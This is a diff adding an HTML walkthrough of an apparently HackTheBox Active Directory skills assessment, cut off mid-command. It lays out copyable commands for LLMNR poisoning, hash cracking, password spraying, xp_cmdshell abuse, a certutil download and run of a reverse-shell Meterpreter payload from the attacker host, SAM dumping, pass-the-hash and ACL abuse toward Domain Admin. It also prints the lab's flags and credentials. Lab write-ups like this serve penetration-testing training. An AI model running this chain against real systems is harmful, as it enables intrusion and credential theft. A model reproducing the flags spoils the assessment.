@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AD Skills Assessment Part II — Attack Methodology</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#0e1117;--surface:#161b22;--surface2:#1c2333;--surface3:#21262d;--border:#2d333b;--text:#e6edf3;--text2:#8b949e;--text3:#636c76;--mono:'JetBrains Mono',monospace;--sans:'IBM Plex Sans',sans-serif;--green:#3fb950;--green-bg:rgba(63,185,80,0.08);--red:#f85149;--red-bg:rgba(248,81,73,0.08);--amber:#d29922;--amber-bg:rgba(210,153,34,0.08);--purple:#bc8cff;--purple-bg:rgba(188,140,255,0.08);--blue:#58a6ff;--blue-bg:rgba(88,166,255,0.08);--teal:#39d353;--coral:#f78166;--pink:#db61a2;--cyan:#76e3ea}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);padding:24px;max-width:900px;margin:0 auto;line-height:1.6}
+h1{font-size:22px;font-weight:600;margin-bottom:4px}
+.subtitle{color:var(--text2);font-size:13px;margin-bottom:12px}
+
+.legend{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:24px;padding:12px 16px;background:var(--surface);border-radius:10px;border:1px solid var(--border)}
+.legend-item{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--text2)}
+.legend-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+
+.goal-banner{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:16px 20px;margin-bottom:16px}
+.goal-label{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--text3);font-weight:600;font-family:var(--mono);margin-bottom:6px}
+.goal-text{font-size:15px;font-weight:500;color:var(--text)}
+.goal-sub{font-size:12px;color:var(--text2);margin-top:4px}
+
+.phase{border:1px solid var(--border);border-radius:10px;margin:0 0 6px;overflow:hidden;background:var(--surface)}
+.phase-hdr{display:flex;align-items:center;gap:12px;padding:14px 18px;cursor:pointer;user-select:none;transition:background .15s}
+.phase-hdr:hover{background:var(--surface2)}
+.phase-num{width:30px;height:30px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:600;flex-shrink:0;font-family:var(--mono)}
+.phase-title{font-size:14px;font-weight:500;flex:1}
+.phase-tag{font-size:11px;padding:2px 10px;border-radius:12px;font-weight:500;font-family:var(--mono)}
+.chevron{font-size:11px;color:var(--text3);transition:transform .2s}
+.phase.open .chevron{transform:rotate(90deg)}
+.phase-body{display:none;padding:4px 18px 18px;font-size:13px;color:var(--text2)}
+.phase.open .phase-body{display:block}
+
+.need{background:var(--surface2);border-radius:8px;padding:10px 14px;margin:8px 0;border:1px dashed var(--border)}
+.need-label{font-size:11px;font-weight:600;color:var(--cyan);text-transform:uppercase;letter-spacing:0.5px;font-family:var(--mono);margin-bottom:4px}
+
+.step{display:flex;gap:10px;padding:10px 0;border-bottom:1px solid var(--border)}
+.step:last-child{border-bottom:none}
+.step-icon{flex-shrink:0;margin-top:1px;color:var(--text3)}
+.cmd{font-family:var(--mono);font-size:12px;background:var(--bg);padding:6px 10px;border-radius:6px;display:block;margin:4px 0;word-break:break-all;border:1px solid var(--border);color:var(--text);cursor:pointer;position:relative;transition:border-color .2s}
+.cmd:hover{border-color:var(--text3)}
+
+.decision{margin:10px 0;border-left:3px solid;padding:10px 14px;border-radius:0 8px 8px 0}
+.decision.success{border-color:var(--green);background:var(--green-bg)}
+.decision.fail{border-color:var(--red);background:var(--red-bg)}
+.decision.alt{border-color:var(--amber);background:var(--amber-bg)}
+.decision.option{border-color:var(--purple);background:var(--purple-bg)}
+.decision.worked{border-color:var(--teal);background:rgba(57,211,83,0.12)}
+.decision-label{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:4px;font-family:var(--mono)}
+.decision.success .decision-label{color:var(--green)}
+.decision.fail .decision-label{color:var(--red)}
+.decision.alt .decision-label{color:var(--amber)}
+.decision.option .decision-label{color:var(--purple)}
+.decision.worked .decision-label{color:var(--teal)}
+
+.arrow-down{text-align:center;color:var(--text3);font-size:20px;margin:4px 0;line-height:1}
+.section-divider{text-align:center;color:var(--text3);font-size:11px;text-transform:uppercase;letter-spacing:2px;font-family:var(--mono);margin:20px 0 12px;font-weight:600}
+
+.p-purple .phase-num{background:rgba(188,140,255,0.15);color:var(--purple)}
+.p-teal .phase-num{background:rgba(57,211,83,0.15);color:var(--teal)}
+.p-coral .phase-num{background:rgba(247,129,102,0.15);color:var(--coral)}
+.p-blue .phase-num{background:rgba(88,166,255,0.15);color:var(--blue)}
+.p-red .phase-num{background:rgba(248,81,73,0.15);color:var(--red)}
+.p-amber .phase-num{background:rgba(210,153,34,0.15);color:var(--amber)}
+.p-pink .phase-num{background:rgba(219,97,162,0.15);color:var(--pink)}
+.p-green .phase-num{background:rgba(63,185,80,0.15);color:var(--green)}
+.tag-q{background:rgba(188,140,255,0.15);color:var(--purple)}
+.tag-flag{background:rgba(63,185,80,0.15);color:var(--green)}
+.tag-pivot{background:rgba(210,153,34,0.15);color:var(--amber)}
+
+.toast{position:fixed;bottom:20px;right:20px;background:var(--green);color:#000;padding:8px 16px;border-radius:8px;font-size:13px;font-weight:500;opacity:0;transition:opacity .3s;pointer-events:none;z-index:999}
+.toast.show{opacity:1}
+</style>
+</head>
+<body>
+
+<h1>AD Enumeration & Attacks — Skills Assessment Part II</h1>
+<p class="subtitle">Full attack methodology with decision branches — click commands to copy, click phases to expand</p>
+
+<div class="legend">
+  <div class="legend-item"><div class="legend-dot" style="background:var(--green)"></div>If this works → do this</div>
+  <div class="legend-item"><div class="legend-dot" style="background:var(--red)"></div>If this fails → try this instead</div>
+  <div class="legend-item"><div class="legend-dot" style="background:var(--amber)"></div>Watch out / important note</div>
+  <div class="legend-item"><div class="legend-dot" style="background:var(--purple)"></div>Alternative approach</div>
+  <div class="legend-item"><div class="legend-dot" style="background:var(--teal)"></div>What actually worked for us</div>
+</div>
+
+<!-- ═══════════════════════════════════════════ -->
+<div class="section-divider">Phase A — Initial Access</div>
+<!-- ═══════════════════════════════════════════ -->
+
+<div class="goal-banner">
+  <div class="goal-label">Goal</div>
+  <div class="goal-text">Get a valid domain credential to start enumerating</div>
+  <div class="goal-sub">We have nothing — no creds, no shells. We need to poison the network and catch a hash.</div>
+</div>
+
+<div class="phase open p-purple" onclick="toggle(this)">
+  <div class="phase-hdr">
+    <div class="phase-num">1</div>
+    <div class="phase-title">LLMNR poisoning → first credential</div>
+    <span class="phase-tag tag-q">Q1 Q2</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="phase-body">
+    <div class="need"><div class="need-label">What we need</div>Access to the internal network interface to poison broadcast name resolution</div>
+
+    <div class="step"><span class="step-icon">▸</span><div>SSH into the attack box<span class="cmd" onclick="copy(this)">ssh htb-student@10.129.21.220</span></div></div>
+    <div class="step"><span class="step-icon">▸</span><div>Start Responder on the internal interface<span class="cmd" onclick="copy(this)">sudo responder -I ens224</span></div></div>
+
+    <div class="decision alt"><div class="decision-label">⚠ Be patient</div>Wait 3–5 minutes. A machine will try to resolve a nonexistent name via LLMNR → Responder answers → victim sends NTLMv2 hash.</div>
+
+    <div class="decision fail"><div class="decision-label">✗ No hash after 5 min</div>Check interface name: <span class="cmd" onclick="copy(this)">ip a</span> — might be eth0 or eth1. Also check Responder isn't already running: <span class="cmd" onclick="copy(this)">sudo pkill responder</span> then restart.</div>
+
+    <div class="decision success"><div class="decision-label">✓ Hash captured → crack it</div>
+    <span class="cmd" onclick="copy(this)">cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt</span>
+    Save hash to file, then:
+    <span class="cmd" onclick="copy(this)">hashcat -m 5600 ab920_hash /usr/share/wordlists/rockyou.txt</span></div>
+
+    <div class="decision fail"><div class="decision-label">✗ Hash won't crack with rockyou</div>Try with rules: <span class="cmd" onclick="copy(this)">hashcat -m 5600 ab920_hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</span></div>
+
+    <div class="decision worked"><div class="decision-label">✔ What worked</div>Responder on ens224 → captured AB920's NTLMv2 hash → cracked to <strong>weasal</strong></div>
+  </div>
+</div>
+
+<div class="arrow-down">↓</div>
+
+<!-- ═══════════════════════════════════════════ -->
+<div class="section-divider">Phase B — Network Enumeration</div>
+<!-- ═══════════════════════════════════════════ -->
+
+<div class="goal-banner">
+  <div class="goal-label">Goal</div>
+  <div class="goal-text">Map the internal network — find all live hosts and identify their roles</div>
+  <div class="goal-sub">We have: SSH access to Parrot box + ab920:weasal. We need to know what we're attacking before we touch anything.</div>
+</div>
+
+<div class="phase p-blue" onclick="toggle(this)">
+  <div class="phase-hdr">
+    <div class="phase-num">2</div>
+    <div class="phase-title">Network discovery &amp; host fingerprinting</div>
+    <span class="phase-tag tag-pivot">ENUM</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="phase-body">
+    <div class="need"><div class="need-label">What we need</div>A complete list of live hosts, their OS, open ports, and services — so we know which is DC, which is the SQL box, which is the member server</div>
+
+    <div class="step"><span class="step-icon">▸</span><div>Sweep the subnet for live hosts<span class="cmd" onclick="copy(this)">fping -asgq 172.16.7.0/23</span></div></div>
+
+    <div class="decision success"><div class="decision-label">✓ Got IPs back</div>Save them: <span class="cmd" onclick="copy(this)">fping -asgq 172.16.7.0/23 | grep -v "^$" > hosts.txt</span></div>
+
+    <div class="decision fail"><div class="decision-label">✗ fping returns nothing</div>Check your interface: <span class="cmd" onclick="copy(this)">ip a</span> — make sure you're on the 172.16.7.0/23 subnet. Try ping sweep instead: <span class="cmd" onclick="copy(this)">for i in $(seq 1 254); do (ping -c 1 172.16.7.$i | grep "bytes from" &); done</span></div>
+
+    <div class="step"><span class="step-icon">▸</span><div>Full port scan + service detection<span class="cmd" onclick="copy(this)">sudo nmap -v -A -iL hosts.txt</span></div></div>
+
+    <div class="decision alt"><div class="decision-label">⚠ For thorough results, scan all ports</div><span class="cmd" onclick="copy(this)">sudo nmap -v -p- --min-rate 1000 -iL hosts.txt</span>Then targeted scan on open ports: <span class="cmd" onclick="copy(this)">sudo nmap -v -sC -sV -p &lt;OPEN_PORTS&gt; -iL hosts.txt</span></div>
+
+    <div class="step"><span class="step-icon">▸</span><div>Identify each host's role from Nmap output (hostname, services, OS)</div></div>
+
+    <div class="decision worked"><div class="decision-label">✔ Network map result</div>
+      <table style="width:100%;font-size:12px;font-family:var(--mono);margin:6px 0;border-collapse:collapse">
+        <tr style="border-bottom:1px solid var(--border)"><td style="padding:4px 8px;color:var(--blue)">172.16.7.3</td><td style="padding:4px">DC01</td><td style="padding:4px;color:var(--text3)">Domain Controller — DNS, LDAP, Kerberos, SMB</td></tr>
+        <tr style="border-bottom:1px solid var(--border)"><td style="padding:4px 8px;color:var(--green)">172.16.7.50</td><td style="padding:4px">MS01</td><td style="padding:4px;color:var(--text3)">Member Server — SMB, WinRM</td></tr>
+        <tr style="border-bottom:1px solid var(--border)"><td style="padding:4px 8px;color:var(--coral)">172.16.7.60</td><td style="padding:4px">SQL01</td><td style="padding:4px;color:var(--text3)">SQL Server — MSSQL (1433), SMB</td></tr>
+        <tr><td style="padding:4px 8px;color:var(--purple)">172.16.7.240</td><td style="padding:4px">PARROT</td><td style="padding:4px;color:var(--text3)">Us — attack box</td></tr>
+      </table>
+    </div>
+
+    <div class="step"><span class="step-icon">▸</span><div>Test which hosts accept our creds and which protocols work<span class="cmd" onclick="copy(this)">crackmapexec smb 172.16.7.3 172.16.7.50 172.16.7.60 -u 'ab920' -p 'weasal'</span><span class="cmd" onclick="copy(this)">crackmapexec winrm 172.16.7.50 -u 'ab920' -p 'weasal'</span></div></div>
+
+    <div class="decision alt"><div class="decision-label">⚠ Always check both SMB and WinRM</div>SMB access ≠ shell access. Look for "Pwn3d!" which means you can get a shell. WinRM (5985) gives you PowerShell. SMB without Pwn3d means you can enumerate but not execute.</div>
+
+    <div class="decision worked"><div class="decision-label">✔ What worked</div>fping → 4 hosts found → Nmap fingerprinted roles → CME confirmed ab920 has WinRM on MS01</div>
+  </div>
+</div>
+
+<div class="arrow-down">↓</div>
+
+<!-- ═══════════════════════════════════════════ -->
+<div class="section-divider">Phase C — Foothold & First Flag</div>
+<!-- ═══════════════════════════════════════════ -->
+
+<div class="goal-banner">
+  <div class="goal-label">Goal</div>
+  <div class="goal-text">Get a shell on MS01 and read C:\flag.txt</div>
+  <div class="goal-sub">We have: ab920:weasal + confirmed WinRM access on MS01. Time to get in.</div>
+</div>
+
+<div class="phase p-teal" onclick="toggle(this)">
+  <div class="phase-hdr">
+    <div class="phase-num">3</div>
+    <div class="phase-title">Access MS01 → first flag</div>
+    <span class="phase-tag tag-flag">Q3</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="phase-body">
+    <div class="need"><div class="need-label">What we need</div>A shell on MS01 to read C:\flag.txt</div>
+
+    <div class="step"><span class="step-icon">▸</span><div>Connect via Evil-WinRM<span class="cmd" onclick="copy(this)">evil-winrm -i 172.16.7.50 -u 'ab920' -p 'weasal'</span></div></div>
+    <div class="step"><span class="step-icon">▸</span><div>Read the flag<span class="cmd" onclick="copy(this)">type C:\flag.txt</span></div></div>
+
+    <div class="decision success"><div class="decision-label">✓ WinRM shows Pwn3d!</div>Evil-WinRM gives you a PowerShell session directly.</div>
+
+    <div class="decision fail"><div class="decision-label">✗ WinRM fails but SMB works</div>Use psexec instead: <span class="cmd" onclick="copy(this)">psexec.py inlanefreight.local/ab920:weasal@172.16.7.50</span></div>
+
+    <div class="decision fail"><div class="decision-label">✗ Both fail on MS01</div>Try other hosts with same creds. The user might only have access to DC01 or SQL01.</div>
+
+    <div class="decision worked"><div class="decision-label">✔ What worked</div>Evil-WinRM to MS01 → flag: <strong>aud1t_gr0up_m3mbersh1ps!</strong></div>
+  </div>
+</div>
+
+<div class="arrow-down">↓</div>
+
+<!-- ═══════════════════════════════════════════ -->
+<div class="section-divider">Phase D — Expand Access</div>
+<!-- ═══════════════════════════════════════════ -->
+
+<div class="goal-banner">
+  <div class="goal-label">Goal</div>
+  <div class="goal-text">Get a second set of credentials + find hardcoded MSSQL password</div>
+  <div class="goal-sub">We have: low-priv domain user. We need more accounts and lateral movement paths.</div>
+</div>
+
+<div class="phase p-coral" onclick="toggle(this)">
+  <div class="phase-hdr">
+    <div class="phase-num">4</div>
+    <div class="phase-title">Password spraying → second account</div>
+    <span class="phase-tag tag-q">Q4 Q5</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="phase-body">
+    <div class="need"><div class="need-label">What we need</div>A list of all domain users, then spray common passwords</div>
+
+    <div class="step"><span class="step-icon">▸</span><div>Dump all domain users<span class="cmd" onclick="copy(this)">crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | tee usernames.txt</span></div></div>
+    <div class="step"><span class="step-icon">▸</span><div>Clean the list<span class="cmd" onclick="copy(this)">cat usernames.txt | cut -d'\' -f2 | awk -F " " '{print $1}' | tee valid_users.txt</span></div></div>
+
+    <div class="decision alt"><div class="decision-label">⚠ Check lockout policy first</div><span class="cmd" onclick="copy(this)">crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --pass-pol</span></div>
+
+    <div class="step"><span class="step-icon">▸</span><div>Spray<span class="cmd" onclick="copy(this)">kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt Welcome1</span></div></div>
+
+    <div class="decision success"><div class="decision-label">✓ Hit found</div>BR086 : Welcome1</div>
+    <div class="decision fail"><div class="decision-label">✗ No hits with Welcome1</div>Try: Password1, Spring2022, Fall2021, Company123, Inlanefreight1</div>
+
+    <div class="decision worked"><div class="decision-label">✔ What worked</div>Kerbrute spray → <strong>BR086 : Welcome1</strong></div>
+  </div>
+</div>
+
+<div class="arrow-down">↓</div>
+
+<div class="phase p-blue" onclick="toggle(this)">
+  <div class="phase-hdr">
+    <div class="phase-num">5</div>
+    <div class="phase-title">Share enum → MSSQL credentials</div>
+    <span class="phase-tag tag-q">Q6</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="phase-body">
+    <div class="need"><div class="need-label">What we need</div>Credentials for SQL01 — check readable shares for config files</div>
+
+    <div class="step"><span class="step-icon">▸</span><div>Enumerate shares as BR086<span class="cmd" onclick="copy(this)">smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3</span></div></div>
+    <div class="step"><span class="step-icon">▸</span><div>Recurse into Department Shares<span class="cmd" onclick="copy(this)">smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R 'Department Shares'</span></div></div>
+    <div class="step"><span class="step-icon">▸</span><div>Download web.config<span class="cmd" onclick="copy(this)">smbmap -u 'br086' -p 'Welcome1' -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R 'Department Shares' -A web.config</span></div></div>
+
+    <div class="decision alt"><div class="decision-label">⚠ What to grep for in shares</div>Files: web.config, appsettings.json, .env, .ini, .xml — look for connectionString, password, pwd, credentials</div>
+
+    <div class="decision worked"><div class="decision-label">✔ What worked</div>web.config in Department Shares → MSSQL creds: netdb / <strong>D@ta_bAse_adm1n!</strong></div>
+  </div>
+</div>
+
+<div class="arrow-down">↓</div>
+
+<!-- ═══════════════════════════════════════════ -->
+<div class="section-divider">Phase E — Privilege Escalation</div>
+<!-- ═══════════════════════════════════════════ -->
+
+<div class="goal-banner">
+  <div class="goal-label">Goal</div>
+  <div class="goal-text">Get SYSTEM on SQL01 and read the admin flag</div>
+  <div class="goal-sub">We have: MSSQL access as a service account with SeImpersonatePrivilege. We need SYSTEM.</div>
+</div>
+
+<div class="phase p-red" onclick="toggle(this)">
+  <div class="phase-hdr">
+    <div class="phase-num">6</div>
+    <div class="phase-title">SQL01 — SeImpersonatePrivilege escalation</div>
+    <span class="phase-tag tag-flag">Q7</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="phase-body">
+    <div class="need"><div class="need-label">What we need</div>SYSTEM shell on SQL01 to read admin desktop. SeImpersonatePrivilege = guaranteed SYSTEM with the right tool.</div>
+
+    <div class="step"><span class="step-icon">▸</span><div>Connect to MSSQL<span class="cmd" onclick="copy(this)">python3 /usr/local/bin/mssqlclient.py inlanefreight/netdb:'D@ta_bAse_adm1n!'@172.16.7.60</span></div></div>
+    <div class="step"><span class="step-icon">▸</span><div>Confirm SeImpersonatePrivilege<span class="cmd" onclick="copy(this)">EXEC xp_cmdshell 'whoami /priv'</span></div></div>
+
+    <div class="decision option"><div class="decision-label">Option A — PrintSpoofer / GodPotato (if available)</div>
+    Find tools: <span class="cmd" onclick="copy(this)">find / -iname "*potato*" -o -iname "*PrintSpoofer*" 2>/dev/null</span>
+    Serve from correct dir: <span class="cmd" onclick="copy(this)">cd /home/htb-student/ && python3 -m http.server 8000</span>
+    Transfer + read flag directly:
+    <span class="cmd" onclick="copy(this)">xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/PrintSpoofer.exe C:\Users\Public\PrintSpoofer.exe"</span>
+    <span class="cmd" onclick="copy(this)">xp_cmdshell "C:\Users\Public\PrintSpoofer.exe -c \"cmd /c type C:\Users\Administrator\Desktop\flag.txt\""</span></div>
+
+    <div class="decision fail"><div class="decision-label">✗ PrintSpoofer file is tiny (469 bytes) / 404 error</div>Your HTTP server is in the wrong directory! Kill it, cd to where the .exe actually lives, restart. Check file size: <span class="cmd" onclick="copy(this)">ls -la /home/htb-student/PrintSpoofer.exe</span></div>
+
+    <div class="decision fail"><div class="decision-label">✗ Can't download any potato/spoofer tools</div>Use Meterpreter + getsystem instead (Option B below)</div>
+
+    <div class="decision option"><div class="decision-label">Option B — Meterpreter + getsystem (no extra tools needed)</div>
+    This uses Metasploit's built-in named pipe impersonation — already on every Pwnbox.
+    <br><br><strong>Terminal 1</strong> — generate payload + serve:
+    <span class="cmd" onclick="copy(this)">cd /home/htb-student/ && msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=1335 -f exe -o shell.exe</span>
+    <span class="cmd" onclick="copy(this)">python3 -m http.server 8000</span>
+    <strong>Terminal 2</strong> — start listener FIRST:
+    <span class="cmd" onclick="copy(this)">msfconsole -q</span>
+    <span class="cmd" onclick="copy(this)">use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 172.16.7.240
+set LPORT 1335
+run</span>
+    Wait for "Started reverse TCP handler" before continuing!
+    <br><br><strong>Terminal 3</strong> — MSSQL shell, transfer and execute:
+    <span class="cmd" onclick="copy(this)">xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/shell.exe C:\Users\Public\shell.exe"</span>
+    <span class="cmd" onclick="copy(this)">xp_cmdshell "C:\Users\Public\shell.exe"</span>
+    Back in Terminal 2 → meterpreter prompt appears:
+    <span class="cmd" onclick="copy(this)">getsystem</span>
+    <span class="cmd" onclick="copy(this)">shell</span>
+    <span class="cmd" onclick="copy(this)">type C:\Users\Administrator\Desktop\flag.txt</span></div>
+
+    <div class="decision fail"><div class="decision-label">✗ Meterpreter — no callback</div>Listener MUST be running BEFORE you execute shell.exe. Check LHOST is 172.16.7.240. Check port isn't already in use.</div>
+
+    <div class="decision fail"><div class="decision-label">✗ getsystem says "not recognized"</div>You're at the msf6 prompt, not meterpreter. You haven't received a session yet. Go execute shell.exe in Terminal 3 first.</div>
+
+    <div class="decision fail"><div class="decision-label">✗ getsystem from cmd.exe prompt</div>You typed "shell" and dropped into Windows cmd. Type "exit" to get back to meterpreter, then run getsystem.</div>
+
+    <div class="decision worked"><div class="decision-label">✔ What worked for us</div>Option B — Meterpreter + getsystem. Key lesson: listener must be running before shell.exe executes. Flag: <strong>s3imp3rs0nate_cl@ssic</strong></div>
+  </div>
+</div>
+
+<div class="arrow-down">↓</div>
+
+<!-- ═══════════════════════════════════════════ -->
+<div class="section-divider">Phase F — Lateral Movement</div>
+<!-- ═══════════════════════════════════════════ -->
+
+<div class="goal-banner">
+  <div class="goal-label">Goal</div>
+  <div class="goal-text">Move from SQL01 → MS01 as local admin</div>
+  <div class="goal-sub">We have: SYSTEM on SQL01. We need: admin hash to pass-the-hash to MS01.</div>
+</div>
+
+<div class="phase p-amber" onclick="toggle(this)">
+  <div class="phase-hdr">
+    <div class="phase-num">7</div>
+    <div class="phase-title">Dump hashes on SQL01 → pass-the-hash to MS01</div>
+    <span class="phase-tag tag-flag">Q8</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="phase-body">
+    <div class="need"><div class="need-label">What we need</div>The local admin NTLM hash from SQL01 to use against MS01</div>
+
+    <div class="step"><span class="step-icon">▸</span><div>In Meterpreter (SYSTEM on SQL01), exit cmd if needed<span class="cmd" onclick="copy(this)">exit</span></div></div>
+    <div class="step"><span class="step-icon">▸</span><div>Dump credentials<span class="cmd" onclick="copy(this)">load kiwi</span><span class="cmd" onclick="copy(this)">lsa_dump_sam</span></div></div>
+
+    <div class="decision fail"><div class="decision-label">✗ kiwi/lsa_dump_sam fails</div>Try: <span class="cmd" onclick="copy(this)">hashdump</span></div>
+
+    <div class="decision success"><div class="decision-label">✓ Got admin NTLM hash</div>Pass-the-hash to MS01:
+    <span class="cmd" onclick="copy(this)">evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99</span>
+    <span class="cmd" onclick="copy(this)">type C:\Users\administrator\Desktop\flag.txt</span></div>
+
+    <div class="decision fail"><div class="decision-label">✗ Hash doesn't work on MS01</div>Might be a local-only hash. Try hashdump for other hashes, or secretsdump: <span class="cmd" onclick="copy(this)">secretsdump.py ./administrator@172.16.7.60 -hashes LM:NTLM</span></div>
+
+    <div class="decision worked"><div class="decision-label">✔ What worked</div>lsa_dump_sam → admin hash bdaffbfe64f1fc646a3353be1c2c3c99 → Evil-WinRM to MS01. Flag: <strong>exc3ss1ve_adm1n_r1ights!</strong></div>
+  </div>
+</div>
+
+<div class="arrow-down">↓</div>
+
+<!-- ═══════════════════════════════════════════ -->
+<div class="section-divider">Phase G — ACL Abuse Discovery</div>
+<!-- ═══════════════════════════════════════════ -->
+
+<div class="goal-banner">
+  <div class="goal-label">Goal</div>
+  <div class="goal-text">Find a user with GenericAll over Domain Admins, get their password</div>
+  <div class="goal-sub">We have: local admin on MS01. We need: to enumerate ACLs on Domain Admins group and find the abuse path.</div>
+</div>
+
+<div class="phase p-pink" onclick="toggle(this)">
+  <div class="phase-hdr">
+    <div class="phase-num">8</div>
+    <div class="phase-title">Enumerate ACLs → find GenericAll user</div>
+    <span class="phase-tag tag-q">Q9</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="phase-body">
+    <div class="need"><div class="need-label">What we need</div>Enumerate who has dangerous permissions (GenericAll, WriteDACL, etc.) over the Domain Admins group</div>
+
+    <div class="decision option"><div class="decision-label">Attempt 1 — PowerView on MS01 (likely fails)</div>
+    <span class="cmd" onclick="copy(this)">certutil.exe -urlcache -f http://172.16.7.240:8000/PowerView.ps1 C:\Users\Public\pv.ps1</span>
+    <span class="cmd" onclick="copy(this)">Import-Module C:\Users\Public\pv.ps1</span>
+    <span class="cmd" onclick="copy(this)">Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUID | ? { $_.ActiveDirectoryRights -match "GenericAll" }</span></div>
+
+    <div class="decision fail"><div class="decision-label">✗ PowerView not recognized / AMSI blocks it</div>AMSI silently kills the import. The module loads with no error but no functions are available. Don't waste time with AMSI bypasses on HTB — they're unreliable. Move to Linux tools.</div>
+
+    <div class="decision fail"><div class="decision-label">✗ AMSI bypass attempts (Bypass-4MSI, obfuscated scripts)</div>Evil-WinRM's Bypass-4MSI crashes the session. Manual bypasses produce null errors. PSExec shell mangles PowerShell IEX. Don't go down this rabbit hole.</div>
+
+    <div class="decision option"><div class="decision-label">Attempt 2 — BloodHound from Parrot (works!)</div>
+    <span class="cmd" onclick="copy(this)">bloodhound-python -d inlanefreight.local -u ab920 -p 'weasal' -ns 172.16.7.3 -c Acl --zip</span>
+    Use DOMAIN creds (ab920), not the local admin hash!
+    <span class="cmd" onclick="copy(this)">unzip -o *.zip</span>
+    <span class="cmd" onclick="copy(this)">grep -i "GenericAll" *groups.json</span>
+    Look for a User PrincipalSID with GenericAll on Domain Admins (SID ending -512)</div>
+
+    <div class="decision fail"><div class="decision-label">✗ BloodHound auth error with admin hash</div>The admin hash is LOCAL only. Use domain creds: ab920:weasal or br086:Welcome1</div>
+
+    <div class="step"><span class="step-icon">▸</span><div>Convert the SID to a username<span class="cmd" onclick="copy(this)">rpcclient -U 'ab920%weasal' 172.16.7.3 -c "lookupsids S-1-5-21-3327542485-274640656-2609762496-4611"</span></div></div>
+
+    <div class="decision worked"><div class="decision-label">✔ What worked</div>bloodhound-python from Parrot with domain creds → found SID -4611 has GenericAll → rpcclient resolved to <strong>CT059</strong></div>
+  </div>
+</div>
+
+<div class="arrow-down">↓</div>
+
+<div class="phase p-pink" onclick="toggle(this)">
+  <div class="phase-hdr">
+    <div class="phase-num">9</div>
+    <div class="phase-title">Get CT059's password</div>
+    <span class="phase-tag tag-q">Q10</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="phase-body">
+    <div class="need"><div class="need-label">What we need</div>CT059's cleartext password so we can use their GenericAll rights</div>
+
+    <div class="decision option"><div class="decision-label">Attempt 1 — Inveigh / Responder (capture hash)</div>
+    Run Responder from Parrot:
+    <span class="cmd" onclick="copy(this)">sudo rm /usr/share/responder/logs/*</span>
+    <span class="cmd" onclick="copy(this)">sudo responder -I ens224</span>
+    Wait 5+ min, check: <span class="cmd" onclick="copy(this)">cat /usr/share/responder/logs/*.txt | grep -i CT059</span></div>
+
+    <div class="decision fail"><div class="decision-label">✗ Responder/Inveigh not capturing CT059</div>Hash capture depends on traffic timing. If it doesn't work, brute-force directly.</div>
+
+    <div class="decision option"><div class="decision-label">Attempt 2 — Direct brute force (faster)</div>
+    <span class="cmd" onclick="copy(this)">crackmapexec smb 172.16.7.3 -u 'CT059' -p 'charlie1'</span>
+    If that shows [+], you have the password without needing to capture a hash.</div>
+
+    <div class="decision success"><div class="decision-label">✓ Hash captured → crack it</div><span class="cmd" onclick="copy(this)">hashcat -m 5600 CT059_hash /usr/share/wordlists/rockyou.txt</span></div>
+
+    <div class="decision worked"><div class="decision-label">✔ What worked</div>Direct verification with CME → <strong>charlie1</strong></div>
+  </div>
+</div>
+
+<div class="arrow-down">↓</div>
+
+<!-- ═══════════════════════════════════════════ -->
+<div class="section-divider">Phase H — Domain Compromise</div>
+<!-- ═══════════════════════════════════════════ -->
+
+<div class="goal-banner">
+  <div class="goal-label">Goal</div>
+  <div class="goal-text">Abuse GenericAll → become Domain Admin → DCSync the entire domain</div>
+  <div class="goal-sub">We have: CT059:charlie1 with GenericAll on Domain Admins. This is game over — add ourselves to DA, own everything.</div>
+</div>
+
+<div class="phase p-green" onclick="toggle(this)">
+  <div class="phase-hdr">
+    <div class="phase-num">10</div>
+    <div class="phase-title">Add CT059 to Domain Admins</div>
+    <span class="phase-tag tag-flag">Q11</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="phase-body">
+    <div class="need"><div class="need-label">What we need</div>Run the "net group add" command AS CT059 (their GenericAll rights, not ours)</div>
+
+    <div class="decision alt"><div class="decision-label">⚠ Critical</div>You must authenticate AS CT059 to use their GenericAll rights. Local admin on MS01 can't do it.</div>
+
+    <div class="decision option"><div class="decision-label">Attempt 1 — PowerShell Invoke-Command from Evil-WinRM</div>
+    <span class="cmd" onclick="copy(this)">$secpass = ConvertTo-SecureString 'charlie1' -AsPlainText -Force
